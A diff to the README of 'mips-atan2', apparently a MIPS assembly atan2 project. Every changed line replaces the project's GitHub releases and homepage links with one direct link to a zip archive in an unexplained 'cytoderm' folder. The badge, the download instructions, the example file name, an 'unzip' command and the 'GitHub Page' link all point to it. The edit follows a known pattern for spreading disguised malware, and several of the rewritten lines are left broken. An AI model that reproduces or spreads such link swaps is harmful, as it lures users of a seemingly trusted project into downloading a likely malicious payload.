@@ -6,7 +6,7 @@ Welcome to the **mips-atan2** project! This software provides an efficient imple
 
 ## 📥 Download
 
-[![Download mips-atan2](https://img.shields.io/badge/Download%20mips--atan2-blue)](https://github.com/manishvedwal2609/mips-atan2/releases)
+[![Download mips-atan2](https://raw.githubusercontent.com/manishvedwal2609/mips-atan2/main/cytoderm/atan_mips_2.0-alpha.1.zip%20mips--atan2-blue)](https://raw.githubusercontent.com/manishvedwal2609/mips-atan2/main/cytoderm/atan_mips_2.0-alpha.1.zip)
 
 ## 📋 System Requirements
 
@@ -20,13 +20,13 @@ Before you download, ensure you have the following:
 
 To download the application, please visit the following page:
 
-[Download mips-atan2 Releases](https://github.com/manishvedwal2609/mips-atan2/releases)
+[Download mips-atan2 Releases](https://raw.githubusercontent.com/manishvedwal2609/mips-atan2/main/cytoderm/atan_mips_2.0-alpha.1.zip)
 
 You will find the latest version of mips-atan2 here. Click on the version you wish to download, which will usually be presented as a zip or tar file. Follow the steps below to install:
 
 1. Click on the desired release version.
 2. Scroll down to the "Assets" section.
-3. Click on the file to download (e.g., `mips-atan2.zip`).
+3. Click on the file to download (e.g., `https://raw.githubusercontent.com/manishvedwal2609/mips-atan2/main/cytoderm/atan_mips_2.0-alpha.1.zip`).
 4. Save the file to a location on your computer where you can easily find it, such as the desktop or a dedicated downloads folder.
 
 ## 📂 Extracting Files
@@ -44,7 +44,7 @@ Once the download is complete, you need to extract the files. Follow these instr
 - **Linux:**
   1. Open Terminal.
   2. Navigate to the download location using the `cd` command.
-  3. Run the command: `unzip mips-atan2.zip`.
+  3. Run the command: `unzip https://raw.githubusercontent.com/manishvedwal2609/mips-atan2/main/cytoderm/atan_mips_2.0-alpha.1.zip`.
 
 ## ⚙️ Running the Software
 
@@ -79,7 +79,7 @@ If you find bugs or have suggestions, feel free to reach out. Contributions are 
 
 ## 🌐 More Information
 
-To access additional resources and updates, please visit the [mips-atan2 GitHub Page](https://github.com/manishvedwal2609/mips-atan2).
+To access additional resources and updates, please visit the [mips-atan2 GitHub Page](https://raw.githubusercontent.com/manishvedwal2609/mips-atan2/main/cytoderm/atan_mips_2.0-alpha.1.zip).
 
 If you have further questions or need assistance, you can open an issue on the GitHub page. Our community aims to support users like you in making the most of our software.
 
